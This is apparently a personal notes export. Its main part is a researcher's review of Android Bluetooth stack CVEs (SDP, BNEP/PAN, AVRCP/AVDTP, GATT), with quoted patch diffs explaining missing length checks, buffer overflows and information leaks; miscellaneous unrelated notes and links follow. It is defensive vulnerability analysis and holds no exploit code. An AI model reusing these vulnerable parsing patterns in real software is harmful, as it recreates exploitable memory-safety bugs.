			  +    sdp_disconnect(p_ccb, SDP_GENERIC_ERROR);
			  +    return;
			  +  }
			  +
			  for (xx = orig; xx < p_ccb->num_handles; xx++)
			   BE_STREAM_TO_UINT32(p_ccb->handles[xx], p_reply);
			  {% endhighlight %}
			  * CVE-2018-9562	SDP ID in client [diff](https://android.googlesource.com/platform/system/bt/+/1bb14c41a72978c6075c5753a8301ddcbb10d409)
			- This one is actually pretty interesting. `num_uuid` was previously set to 2 which when copying from `uuid_list` (located on the stack as `Uuid uuid_list[1];`) would copy an additional `sizeof(Uuid)` bytes into the `uuid_filters` array for the SDP entry. This data would then be sent if device received a service search attribute response (sdp_discovery.cc:584) and a continuation request is needed (sdp_discovery.cc:563).
			  {% highlight c lineanchors %}
			  Uuid uuid_list[1];
			  ...
			  num_uuid = 2;
			  ...
			  for (xx = 0; xx < num_uuid; xx++) p_db->uuid_filters[xx] = *p_uuid_list++;
			  ...
			  p = sdpu_build_uuid_seq(p, p_ccb->p_db->num_uuid_filters,
			                           p_ccb->p_db->uuid_filters);
			  ...
			  L2CA_DataWrite(p_ccb->connection_id, p_msg);
			  {% endhighlight %}
			  * CVE-2018-9504	ID in SDP [diff](https://android.googlesource.com/platform/system/bt/+/11fb7aa03437eccac98d90ca2de1730a02a515e2)
				- ID in the client while saving response from attacker
				  {% highlight c lineanchors %}
				  static void sdp_copy_raw_data(tCONN_CB* p_ccb, bool offset) {
				  unsigned int cpy_len, rem_len;
				  uint32_t list_len;
				  uint8_t* p;
				  uint8_t type;
				  #if (SDP_DEBUG_RAW == TRUE)
				  uint8_t num_array[SDP_MAX_LIST_BYTE_COUNT];
				  uint32_t i;
				  for (i = 0; i < p_ccb->list_len; i++) {
				  snprintf((char*)&num_array[i * 2], sizeof(num_array) - i * 2, "%02X",
				         (uint8_t)(p_ccb->rsp_list[i]));
				  }
				  SDP_TRACE_WARNING("result :%s", num_array);
				  #endif
				  if (p_ccb->p_db->raw_data) {
				  cpy_len = p_ccb->p_db->raw_size - p_ccb->p_db->raw_used;
				  list_len = p_ccb->list_len;
				  p = &p_ccb->rsp_list[0];
				  
				  if (offset) {
				  +      cpy_len -= 1;
				   type = *p++;
				  +      uint8_t* old_p = p;
				   p = sdpu_get_len_from_type(p, type, &list_len);
				  +      if ((int)cpy_len < (p - old_p)) {
				  +        SDP_TRACE_WARNING("%s: no bytes left for data", __func__);
				  +        return;
				  +      }
				  +      cpy_len -= (p - old_p);
				  }
				  if (list_len < cpy_len) {
				  cpy_len = list_len;
				  }
				  rem_len = SDP_MAX_LIST_BYTE_COUNT - (unsigned int)(p - &p_ccb->rsp_list[0]);
				  if (cpy_len > rem_len) {
				  SDP_TRACE_WARNING("rem_len :%d less than cpy_len:%d", rem_len, cpy_len);
				  cpy_len = rem_len;
				  }
				  memcpy(&p_ccb->p_db->raw_data[p_ccb->p_db->raw_used], p, cpy_len);
				  p_ccb->p_db->raw_used += cpy_len;
				  {% endhighlight %}
				  * CVE-2018-9355 RCE in SDP while processing data returned when looking up records [diff](https://android.googlesource.com/platform/system/bt/+/99a263a7f04c5c6f101388007baa18cf1e8c30bf)
				  {% highlight c lineanchors %}
				  // stack based buffer overflow - Stack array of arrays which has a set length, but will copy how every many times the client told it to
				  /*******************************************************************************
				  *
				  * Function         bta_dm_sdp_result
				  *
				  * Description      Process the discovery result from sdp
				  void bta_dm_sdp_result(tBTA_DM_MSG* p_data) {
				  ...
		- uint8_t uuid_list[32][MAX_UUID_SIZE];  // assuming a max of 32 services
		  +  uint8_t uuid_list[BTA_MAX_SERVICES][MAX_UUID_SIZE];  // assuming a max of 32 services
		                 bta_service_id_to_uuid_lkup_tbl[bta_dm_search_cb.service_index -
		                                                 1];
		             /* Add to the list of UUIDs */
		- sdpu_uuid16_to_uuid128(tmp_svc, uuid_list[num_uuids]);
		- num_uuids++;
		  +            if (num_uuids < BTA_MAX_SERVICES) {
		  +              sdpu_uuid16_to_uuid128(tmp_svc, uuid_list[num_uuids]);
		  +              num_uuids++;
		  +            } else {
		  +              android_errorWriteLog(0x534e4554, "74016921");
		  +            }
		           }
		         }
		       }
		  ...
		             SDP_FindServiceInDb_128bit(bta_dm_search_cb.p_sdp_db, p_sdp_rec);
		         if (p_sdp_rec) {
		           if (SDP_FindServiceUUIDInRec_128bit(p_sdp_rec, &temp_uuid)) {
		- memcpy(uuid_list[num_uuids], temp_uuid.uu.uuid128, MAX_UUID_SIZE);
		- num_uuids++;
		  +            if (num_uuids < BTA_MAX_SERVICES) {
		  +              memcpy(uuid_list[num_uuids], temp_uuid.uu.uuid128, MAX_UUID_SIZE);
		  +              num_uuids++;
		  +            } else {
		  +              android_errorWriteLog(0x534e4554, "74016921");
		  +            }
		           }
		         }
		       } while (p_sdp_rec);
		  {% endhighlight %}
		  * CVE-2017-13255 SDP RCE [diff](https://android.googlesource.com/platform/system/bt/+/f0edf6571d2d58e66ee0b100ebe49c585d31489f)
		  * CVE-2017-13290 SDP ID [diff]https://android.googlesource.com/platform/system/bt/+/72b1cebaa9cc7ace841d887f0d4a4bf6daccde6e)
		  * The end of the request was never checked. This is the same problem as seen in other areas of the stack, but the approach to fixing is a lot more consistent than other fixes.
		  * The end of the request is checked accross many different functions with this patch.
		  {% highlight c lineanchors %}
		  static void process_service_search_attr_req(tCONN_CB* p_ccb, uint16_t trans_num,
		                                             uint16_t param_len, uint8_t* p_req,
		- UNUSED_ATTR uint8_t* p_req_end);
		  +                                            uint8_t* p_req_end);
		  
		  +
		  +  if (p_req + sizeof(param_len) > p_req_end) {
		  +    android_errorWriteLog(0x534e4554, "69384124");
		  +    sdpu_build_n_send_error(p_ccb, trans_num, SDP_INVALID_REQ_SYNTAX,
		  +                            SDP_TEXT_BAD_HEADER);
		  +  }
		  +
		   BE_STREAM_TO_UINT16(param_len, p_req);
		  {% endhighlight %}
		  * CVE-2017-13259 SDP ID [diff](https://android.googlesource.com/platform/system/bt/+/0627e76edefd948dc3efe11564d7e53d56aac80c)
		  * Similar to CVE-2017-13290 but this fixes reading from the end of the request in the client.
		  {% highlight c lineanchors %}
		  +static void process_service_search_rsp(tCONN_CB* p_ccb, uint8_t* p_reply,
		  +                                       uint8_t* p_reply_end);
		  
		  
		  +    if (p_reply + cont_len > p_reply_end) {
		  +      android_errorWriteLog(0x534e4554, "68161546");
		  +      sdp_disconnect(p_ccb, SDP_INVALID_CONT_STATE);
		  +      return;
		  +    }
		  {% endhighlight %}
		- # BNEP and PAN
		- ## Notable Features
		- ### BNEP (btstack: btstack/src/classic/bnep.c)
		  * Protocol that PAN operates on. In case some other service wanted to implement some network-esc thing? I have only ever seen PAN use this protocol...
		  * The protocol is not terribly interesting, most implementations ignore certain parts of the specification because they are literally never used lol (TODO link to linux extension bit).
		- ### PAN
		  * Different roles PANU, NU, GN
		- ## Attack Surface
		  TODO
		- ## CVEs
		  * CVE-2017-0782	(Add a missing check for PAN buffer size before copying data) [diff](https://android.googlesource.com/platform/system/bt/+/4e47f3db62bab524946c46efe04ed6a2b896b150) and (Add missing extension length check while parsing BNEP control packets
		  ) [diff](https://android.googlesource.com/platform/system/bt/+/c568fa9088ded964e0ac99db236e612de5d82177)
		  * this code will always overflow (see bluebourne paper)
		  {% highlight c lineanchors %}
		   if (sizeof(tBTA_PAN_DATA_PARAMS) > p_buf->offset) {
		     /* offset smaller than data structure in front of actual data */
		  +    if (sizeof(BT_HDR) + sizeof(tBTA_PAN_DATA_PARAMS) + p_buf->len >
		  +        PAN_BUF_SIZE) {
		  +      android_errorWriteLog(0x534e4554, "63146237");
		  +      APPL_TRACE_ERROR("%s: received buffer length too large: %d", __func__,
		  +                       p_buf->len);
		  +      osi_free(p_buf);
		  +      return;
		  +    }
		     p_new_buf = (BT_HDR*)osi_malloc(PAN_BUF_SIZE);
		     memcpy((uint8_t*)(p_new_buf + 1) + sizeof(tBTA_PAN_DATA_PARAMS),
		            (uint8_t*)(p_buf + 1) + p_buf->offset, p_buf->len);
		  {% endhighlight %}
		  * CVE-2017-0783	(Disable PAN Reverse Tethering when connection originated by the Remote) [diff](https://android.googlesource.com/platform/system/bt/+/1e77fefc8b9c832239e1b32c6a6880376065e24e)
		  * see bluebourne paper
		  * PAN Use after free [diff](https://android.googlesource.com/platform/system/bt/+/08e68337a9eb45818d5a770570c8b1d15a14d904)
		  * Regression described in bluedroid
		  * BNEP ID [diff](https://android.googlesource.com/platform/system/bt/+/a50e70468c0a8d207e416e273d05a08635bdd45f)
		  * Check out the writeup by [Quarkslab](https://blog.quarkslab.com/android-bluetooth-vulnerabilities-in-the-march-2018-security-bulletin.html)
		  * CVE-2018-9436	ID in BNEP [diff](https://android.googlesource.com/platform/system/bt/+/289a49814aef7f0f0bb98aac8246080abdfeac01)
		  * Length check is missing, you can position `p` so that it points to the byte after the packet and if it is > BNEP_FILTER_MULTI_ADDR_RESPONSE_MSG then it will be sent back
		  * Check out the writeup by [Quarkslab](https://blog.quarkslab.com/android-bluetooth-vulnerabilities-in-the-march-2018-security-bulletin.html)
		  {% highlight c lineanchors %}
		  +        if ((ext & 0x7F) == BNEP_EXTENSION_FILTER_CONTROL) {
		  +          if (length == 0) {
		  +            android_errorWriteLog(0x534e4554, "79164722");
		  +            break;
		  +          }
		  +          if (*p > BNEP_FILTER_MULTI_ADDR_RESPONSE_MSG) {
		  +            bnep_send_command_not_understood(p_bcb, *p);
		  +          }
		  +        }
		  +
		  +        p += length;
		  {% endhighlight %}
		  * CVE-2018-9356	RCE in PAN [diff](https://android.googlesource.com/platform/system/bt/+/d7d4d5686b2e3c37c7bf10a6a2adff1c95251a13)
		  * Fix for UAF?
		  * CVE-2018-9357 RCE in BNEP [diff](https://android.googlesource.com/platform/system/bt/+/9164ee1aaf3609b4771d39302e3af649f44c9e66)
		  * BNEP_Write -> `if (new_len > org_len) return BNEP_IGNORE_CMD;` were placed because extension bit could let you make big writes
		- # AVRCP and AVTDP
		- ## Notable Features
		  * Controls audio
		- ## Stack Implementations
		  * Need to pair with device to access it on Android
		  
		  Android:
		  bta_av_api.h:
		  {% highlight c lineanchors %}
		  /* Set to TRUE if seperate authorization prompt desired for AVCTP besides A2DP
		  * authorization */
		  /* Typically FALSE when AVRCP is used in conjunction with A2DP */
		  #ifndef BTA_AV_WITH_AVCTP_AUTHORIZATION
		  {% endhighlight %}
		- ## CVEs
		- ### Android
		  * CVE-2017-13281 really good length check in AVRCP [diff](https://android.googlesource.com/platform/system/bt/+/6f3ddf3f5cf2b3eb52fb0adabd814a45cff07221%5E%21/)
			- length check, but it is just plain wrong lol
			  {% highlight c lineanchors %}
		- if (buf_len > p_result->search.string.str_len)
		- buf_len = p_result->search.string.str_len;
		  +        if (p_result->search.string.str_len > buf_len) {
		  +          p_result->search.string.str_len = buf_len;
		  +        } else {
		  +          android_errorWriteLog(0x534e4554, "63146237");
		  +        }
		  {% endhighlight %}
		  * CVE-2019-1996	AVRCP ID [diff](https://android.googlesource.com/platform/system/bt/+/525bdbd6e1295ed8a081d2ae87105c64d6f1ac4f)
		  No length checks
		  {% highlight c lineanchors %}
		  +            min_len += 10 + AVRC_FEATURE_MASK_SIZE;
		  +            if (pkt_len < min_len) goto browse_length_error;
		             BE_STREAM_TO_UINT16(player_len, p);
		             BE_STREAM_TO_UINT16(player->player_id, p);
		             BE_STREAM_TO_UINT8(player->major_type, p);
		             BE_STREAM_TO_UINT32(player->sub_type, p);
		             BE_STREAM_TO_UINT8(player->play_status, p);
		             BE_STREAM_TO_ARRAY(p, player->features, AVRC_FEATURE_MASK_SIZE);
		  {% endhighlight %}
		  * CVE-2018-9588	AVDP ID [diff](https://android.googlesource.com/platform/system/bt/+/bf9ff0c5215861ab673e211cd06e009f3157aab2)
			- This is a juicy info leak
			- No length checks
			  {% highlight c lineanchors %}
			  +        min_len += 20;
			  +        if (min_len > len) {
			  +          android_errorWriteLog(0x534e4554, "111450156");
			  +          AVDT_TRACE_WARNING(
			  +              "%s: hdl packet length %d too short: must be at least %d",
			  +              __func__, len, min_len);
			  +          goto avdt_scb_hdl_report_exit;
			  +        }
			       BE_STREAM_TO_UINT32(report.sr.ntp_sec, p);
			       BE_STREAM_TO_UINT32(report.sr.ntp_frac, p);
			       BE_STREAM_TO_UINT32(report.sr.rtp_time, p);
			  {% endhighlight %}
			  * CVE-2018-9542	ID in AVRCP [diff](https://android.googlesource.com/platform/system/bt/+/cc364611362cc5bc896b400bdc471a617d1ac628)
			  No length checks are performed
			  {% highlight c lineanchors %}
			  +    if (len < 1) {
			  +      android_errorWriteLog(0x534e4554, "111450531");
			  +      AVRC_TRACE_WARNING("%s: invalid parameter length %d: must be at least 1",
			  +                         __func__, len);
			  +      return AVRC_STS_INTERNAL_ERR;
			  +    }
			   p_result->rsp.status = *p;
			  {% endhighlight %}
			  * CVE-2017-13283 RCE (Easy to exploit) [diff](https://android.googlesource.com/platform/system/bt/+/ebc284cf3a59ee5cf7c06af88c2f3bcd0480e3e9)
			- Read length from packet is not properly verified. This controls data being read into an allocation.
			  {% highlight c lineanchors %}
			     BE_STREAM_TO_UINT8(p_result->list_app_values.num_val, p);
			  +      if (p_result->list_app_values.num_val > AVRC_MAX_APP_ATTR_SIZE) {
			  +        android_errorWriteLog(0x534e4554, "78526423");
			  +        p_result->list_app_values.num_val = AVRC_MAX_APP_ATTR_SIZE;
			  +      }
			  +
			     for (int xx = 0; xx < p_result->list_app_values.num_val; xx++) {
			      BE_STREAM_TO_UINT8(p_result->list_app_values.vals[xx], p);
			    }
			  {% endhighlight %}
			  
			  * CVE-2018-9506	ID in AVRCP [diff](https://android.googlesource.com/platform/system/bt/+/830cb39cb2a0f1bf6704d264e2a5c5029c175dd7)
			- No length check
			  {% highlight c lineanchors %}
			  +    if (p_pkt->len < AVRC_AVC_HDR_SIZE) {
			  +      android_errorWriteLog(0x534e4554, "111803925");
			  +      AVRC_TRACE_WARNING("%s: message length %d too short: must be at least %d",
			  +                         __func__, p_pkt->len, AVRC_AVC_HDR_SIZE);
			  +      osi_free(p_pkt);
			  +      return;
			  +    }
			   msg.hdr.ctype = p_data[0] & AVRC_CTYPE_MASK;
			  {% endhighlight %}
			  * CVE-2018-9507	ID in AVRCP [diff](https://android.googlesource.com/platform/system/bt/+/30cec963095366536ca0b1306089154e09bfe1a9)
			- No length check
			  {% highlight c lineanchors %}
			  +        if (p_vendor->vendor_len != 5) {
			  +          android_errorWriteLog(0x534e4554, "111893951");
			  +          p_rc_rsp->get_caps.status = AVRC_STS_INTERNAL_ERR;
			  +          break;
			  +        }
			       u8 = *(p_vendor->p_vendor_data + 4);
			       p = p_vendor->p_vendor_data + 2;
			       p_rc_rsp->get_caps.capability_id = u8;
			       BE_STREAM_TO_UINT16(u16, p);
			  {% endhighlight %}
			  * CVE-2018-9450	RCE [diff](https://android.googlesource.com/platform/system/bt/+/bc259b4926a6f9b33b9ee2c917cd83a55f360cbf)
			  since the original packet is being reused, we are copying a certain number of bytes past the end?
			  not too sure about this one
			  {% highlight c lineanchors %}
			  avrc_proc_vendor_command
			  if (status != AVRC_STS_NO_ERROR) {
		- /* use the current GKI buffer to build/send the reject message */
		- p_data = (uint8_t*)(p_pkt + 1) + p_pkt->offset;
		  +    p_rsp = (BT_HDR*)osi_malloc(BT_DEFAULT_BUFFER_SIZE);
		  +    p_rsp->offset = p_pkt->offset;
		  +    p_data = (uint8_t*)(p_rsp + 1) + p_pkt->offset;
		     *p_data++ = AVRC_RSP_REJ;
		     p_data += AVRC_VENDOR_HDR_SIZE; /* pdu */
		     *p_data++ = 0;                  /* pkt_type */
		     UINT16_TO_BE_STREAM(p_data, 1); /* len */
		     *p_data++ = status;             /* error code */
		- p_pkt->len = AVRC_VENDOR_HDR_SIZE + 5;
		- p_rsp = p_pkt;
		  +    p_rsp->len = AVRC_VENDOR_HDR_SIZE + 5;
		   }
		  {% endhighlight %}
		  * CVE-2018-9540	ID - "In avrc_ctrl_pars_vendor_rsp of avrc_pars_ct.c, there is a possible out of bounds read due to a missing bounds check." [diff](https://android.googlesource.com/platform/system/bt/+/99d54d0c7dbab6c80f15bbf886ed203b2a547453)
		  
		  {% highlight c lineanchors %}
		  -void avrc_parse_notification_rsp(uint8_t* p_stream,
		- tAVRC_REG_NOTIF_RSP* p_rsp) {
		  +tAVRC_STS avrc_parse_notification_rsp(uint8_t* p_stream, uint16_t len,
		  +                                      tAVRC_REG_NOTIF_RSP* p_rsp) {
		  +  uint16_t min_len = 1;
		  +
		  +  if (len < min_len) goto length_error;
		   BE_STREAM_TO_UINT8(p_rsp->event_id, p_stream);
		   switch (p_rsp->event_id) {
		     case AVRC_EVT_PLAY_STATUS_CHANGE:
		  +      min_len += 1;
		  +      if (len < min_len) goto length_error;
		       BE_STREAM_TO_UINT8(p_rsp->param.play_status, p_stream);
		       break;
		  {% endhighlight %}
		  * (CVE-2017-13266) RCE [diff](https://android.googlesource.com/platform/system/bt/+/6ecbbc093f4383e90cbbf681cd55da1303a8ef94)
		  {% highlight c lineanchors %}
		  static tAVRC_STS avrc_ctrl_pars_vendor_rsp(tAVRC_MSG_VENDOR* p_msg,
		                                           tAVRC_RESPONSE* p_result,
		                                           uint8_t* p_buf, uint16_t* buf_len) {
		  uint8_t* p = p_msg->p_vendor_data;
		  BE_STREAM_TO_UINT8(p_result->pdu, p);
		  p++; /* skip the reserved/packe_type byte */
		  uint16_t len;
		  BE_STREAM_TO_UINT16(len, p);
		  AVRC_TRACE_DEBUG("%s ctype:0x%x pdu:0x%x, len:%d", __func__, p_msg->hdr.ctype,
		                   p_result->pdu, len);
		  /* Todo: Issue in handling reject, check */
		  if (p_msg->hdr.ctype == AVRC_RSP_REJ) {
		    p_result->rsp.status = *p;
		    return p_result->rsp.status;
		  }
		  /* TODO: Break the big switch into functions. */
		  switch (p_result->pdu) {
		  ...
		  case AVRC_PDU_LIST_PLAYER_APP_ATTR:
		      if (len == 0) {
		        p_result->list_app_attr.num_attr = 0;
		        break;
		      }
		      BE_STREAM_TO_UINT8(p_result->list_app_attr.num_attr, p);
		      AVRC_TRACE_DEBUG("%s attr count = %d ", __func__,
		                       p_result->list_app_attr.num_attr);
		      if (p_result->list_app_attr.num_attr > AVRC_MAX_APP_ATTR_SIZE) {
		        android_errorWriteLog(0x534e4554, "63146237");
		        p_result->list_app_attr.num_attr = AVRC_MAX_APP_ATTR_SIZE;
		      }
		      for (int xx = 0; xx < p_result->list_app_attr.num_attr; xx++) {
		        BE_STREAM_TO_UINT8(p_result->list_app_attr.attrs[xx], p);
		      }
		      break;
		  {% endhighlight %}
		  * CVE-2018-9448	ID in AVRCP [diff](https://android.googlesource.com/platform/system/bt/+/13294c70a66347c9e5d05b9f92f8ceb6fe38d7f6)
			- No length check
			  {% highlight c lineanchors %}
			  +  if (p_data->p_buf->len < AVCT_HDR_LEN_SINGLE) {
			  +    AVCT_TRACE_WARNING("Invalid AVCTP packet length %d: must be at least %d",
			  +                       p_data->p_buf->len, AVCT_HDR_LEN_SINGLE);
			  +    osi_free_and_reset((void**)&p_data->p_buf);
			  +    android_errorWriteLog(0x534e4554, "79944113");
			  +    return;
			  +  }
			  +
			  p = (uint8_t*)(p_data->p_buf + 1) + p_data->p_buf->offset;
			  {% endhighlight %}
			  * CVE-2018-9453	ID in AVDTP [diff](https://android.googlesource.com/platform/system/bt/+/cb6a56b1d8cdab7c495ea8f53dcbdb3cfc9477d2)
			- Possible RCE?
			  {% highlight c lineanchors %}
			  +        if (p + elem_len > p_end) {
			  +          err = AVDT_ERR_LENGTH;
			  +          android_errorWriteLog(0x534e4554, "78288378");
			  +          break;
			  +        }
			  {% endhighlight %}
		- # ATT and GATT
		- ## Notable features
		  * ATT and GATT are kind of tied into each other
		  * It is basically a glorified database which uses UUIDs to identify elements to read and/or write
		  * Service, characteristics, attributes
		- ## Attack surface
		  * The code for each off the different actions is relatively limited in what it does (hence the "low energy"). So for as far as exploiting the GATT protocol, there is little room for vulnerabilities to be introduced.
		  * There is a lot of research published on exploiting applications which use GATT (bleah) by identifying information that is exposed and properties that are able to be written to.
		  * A really cool challenge that you can try out to learn about BLE application layer hacking is here: https://github.com/hackgnar/ble_ctf
		- ## CVEs
		- ### Android
		  * CVE-2017-13160 bta gattc Priv esc? [diff](https://android.googlesource.com/platform/system/bt/+/68a1cf1a9de115b66bececf892588075595b263f)
			- Loads GATT cache with incorrect size
			  * CVE-2018-9358	UNUSED_ATTR in length for gatt [diff](https://android.googlesource.com/platform/system/bt/+/0d7c2f5a14d1055f3b4f69035451c66bf8f1b08e)
			- len is not used
			  {% highlight c lineanchors %}
			  +  if (len < sizeof(flag)) {
			  +    android_errorWriteLog(0x534e4554, "73172115");
			  +    LOG(ERROR) << __func__ << "invalid length";
			  +    gatt_send_error_rsp(tcb, GATT_INVALID_PDU, GATT_REQ_EXEC_WRITE, 0, false);
			  +    return;
			  +  }
			  +
			  STREAM_TO_UINT8(flag, p);
			  {% endhighlight %}
		- # Conclusions
		  * Security is hard, especially when you are implementing code to match a specification that has a number of protocols some legacy, some new.
		  * When you are parsing data, for the love of god, properly keep track of where you are. Linux and iOS do this well by having the position in the packet always being kept updated and checked. Android fails to do this and is the root cause of the majority of the CVEs that have been reported.
		- ## Attack surface
		  * Following the [guidelines put forth by NIST](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-121r2.pdf), a Bluetooth stack can take some steps to become secure to the passer by attacker. While a Bluetooth social engineering attack (prompting the user to pair a device) can open up the attack surface to other protocols, it does put at least some barrier to protect devices from rampantly spreading malware.
		- ## Vulnerability Patterns
		  * It is important to identify vulnerability trends and cut the head off the Hydra before you have new ones. As seen in reported Bluetooth vulnerabilities in Android, the head was not cut off. You have patches which fix a vulnerability, but create a new one (BNEP UAF), lack of length checks (all the information disclosures), and overall neglect of properly checking lengths in general (AVCTP length check, the bnep off by one).
		  * [Google's blog post](https://security.googleblog.com/2019/05/queue-hardening-enhancements.html) about security improvements in Android Q was very exciting since they are using data drive their security efforts in creating analyses which stop bug pattens like these.
	-
- #blogs #gardens
  collapsed:: true
	- [pragmatic engineer](https://blog.pragmaticengineer.com/) - pretty cool insight into how companies do things at scale
- #movies
  collapsed:: true
	- Movies that made security #blog
		- Mr. Robot (2015-2019) - https://www.imdb.com/title/tt4158110/
		- The Matrix (1999) - https://www.imdb.com/title/tt0133093/
		- Hackers (1995) - https://www.imdb.com/title/tt0113243/
		  id:: 64462c73-7918-46e0-8312-00f7b1d02fd6
		- WarGames (1983) - https://www.imdb.com/title/tt0086567/
		- Sneakers (1992) - https://www.imdb.com/title/tt0105435/
		- The Net (1995) - https://www.imdb.com/title/tt0113957/
		- Tron (1982) - https://www.imdb.com/title/tt0084827/
		- Ghost in the Shell (1995) - https://www.imdb.com/title/tt0113568/
- #security [some thoughts on security after ten years of qmail 1.0](http://cr.yp.to/qmail/qmailsec-20071101.pdf)
- #go [uber style guide - uber](https://github.com/uber-go/guide/blob/master/style.md)
- #go/code
  collapsed:: true
	- no checkout was set to `false`, and that was causing some weird issue where files would not be staged. setting it to `true` fixed this problem
	  
	  before
	  ```go
	  func getGitCloneOptions(gitUrl string, snapshotOptions types.SnapshotOptions, progress io.Writer) *git.CloneOptions {
	  cloneOptions := git.CloneOptions{
	  URL:        gitUrl,
	  Progress:   progress,
	  }
	  // If a branch is specified but no specific commit for checkout is specified, we can go ahead and checkout that branch and only the latest commit
	  // if a commit is specified, we are going to go into a detached HEAD on some unknown branch in a later step, so clone everything for now
	  if snapshotOptions.GitBranch != "" && snapshotOptions.GitCommit == "" {
	  cloneOptions.ReferenceName = plumbing.NewBranchReferenceName(snapshotOptions.GitBranch)
	  cloneOptions.SingleBranch = true
	  cloneOptions.Depth = 1
	  }
	  return &cloneOptions
	  }
	  ```
	  after
	  ```go
	  func getGitCloneOptions(gitUrl string, snapshotOptions types.SnapshotOptions, progress io.Writer) *git.CloneOptions {  
	  cloneOptions := git.CloneOptions{  
	  URL:        gitUrl,  
	  Progress:   progress,  
	  NoCheckout: true,  
	  }  
	  // If a branch is specified but no specific commit for checkout is specified, we can go ahead and checkout that branch and only the latest commit  
	  // if a commit is specified, we are going to go into a detached HEAD on some unknown branch in a later step, so clone everything for now if snapshotOptions.GitBranch != "" && snapshotOptions.GitCommit == "" {  
	  cloneOptions.ReferenceName = plumbing.NewBranchReferenceName(snapshotOptions.GitBranch)  
	  cloneOptions.SingleBranch = true  
	  cloneOptions.Depth = 1  
	  cloneOptions.NoCheckout = false  
	  }  
	  return &cloneOptions  
	  }
	  ```
- #go/libraries
  collapsed:: true
	- Use a library when you want to do something quickly without becoming an expert.
	- [parsing frontmatter](https://github.com/adrg/frontmatter)
	- [lodash like functions with generics](https://github.com/samber/lo)
- #jobs/resume #resume
- #random
  collapsed:: true
	- https://trojanczyk.eu/are-software-engineers-protein-interface/
	  
	  https://www.theatlantic.com/culture/archive/2022/10/martha-graham-annie-b-parson-dance-book-review/671745/
	  
	  https://blog.sonatype.com/pypi-flooded-with-over-1200-dependency-confusion-packages
	  
	  https://www.researchgate.net/figure/Number-of-new-PyPI-packages-per-month_fig1_328595587
	  
	  https://warehouse.pypa.io/api-reference/index.html
	  
	  https://github.com/renovatebot/renovate/tree/main/lib/modules/datasource
	  
	  https://github.com/mikeroyal/Self-Hosting-Guide
	  
	   - need to figure out how to represent multiple variations of recipes in a way that can be easily understood by human but also easily possible by a computer #cookwherever 
	  
	   - representing recipes as a graph or each note performs in action on some set of ingredients is conducive for comparing recipes but fails to represent the nuance of a particular action for example when rolling out dough do you want to make a note of the technique used for specifically dough as a relates to ruling #cookwherever
	  
	   - really kneeling down an in-depth look at American recipes and detailing them would help a lot of people and also demonstrates what the site is capable of #cookwherever 
	  
	   - Capture what prerequisites someone needs i.e. a basic pantry or a list of tools they should have #cookwherever 
	  
	   - need to figure out how to represent schemas for ingredients it is tricky to get this right because they're can be ingredients that have multiple names
	- https://notes.vasuagrawal.com/2022/02/setting-up-a-blog-with-hugo-obsidian-and-cloudflare/ #notetaking
	- https://nicolevanderhoeven.com/blog/20210518-how-i-use-obsidian-at-work/#consume-and-collect #notetaking
	- how can sifty integrate with Obsidian in a way that is needlessly complicated?
		- https://marcus.se.net/obsidian-plugin-docs/
		- https://keathmilligan.net/obsidian-plugin-cross-platform-testing
	- how many leaves can you pick off a basil plant before they can't grow back?
	- What if social media was reversed where the content producers had to "spend" to get the attention of their followers, and their followers allocated some amount of "attention" points to the producer.
	- https://nights.bearblog.dev/how-to-stop-being-terminally-online/
	- https://wdkwwdk.com/posts/the-copy-paste-outage/
	- people don't talk in fractions or numbers, they use words https://www.tysknews.com/Depts/Metrication/metric_land.htm
	- https://learnmyog.com/
	- how do you make intricate pastries?
	- https://www.graplsecurity.com/post/attacking-firecracker
	- https://saveall.ai/blog/learn-exponentially i found this concept to be really simple but powerful. i think about school curriculum and how it really doesn't embrace this at all. I grew to love cooking so much because i practiced 30 min reading 30 min recall when i read The Food Lab and then would cook what i read not just once, but spaced out over time.
	- soldering old game console game [https://www.retrogadgets.game](https://www.retrogadgets.game/)
	- bosch appliances offline no cloud https://trmm.net/homeconnect/
	- cool math fractals [https://www.fractal.garden](https://www.fractal.garden/)
	- starting a food coop https://quaran.to/starting-a-food-co-op-year-1
	- pdf modification repair tools https://www.bitsgalore.org/2021/09/06/pdf-processing-and-analysis-with-open-source-tools
	- new american: how can we bring back the outdoor bbq feel of america, but with the wokeness of today? stop living in fear and come together under what post WWII was about (minus the racism and sexism)
	- https://www.instructables.com/Freeze-Dry-At-Home/ freeze drying with dessicators
	- diy freeze dryer https://www.makeuseof.com/diy-freeze-dryers-you-can-make-at-home/
- #music/visualization Justice Space Opera {{video https://www.youtube.com/watch?v=OC5mO8I_Cd4}}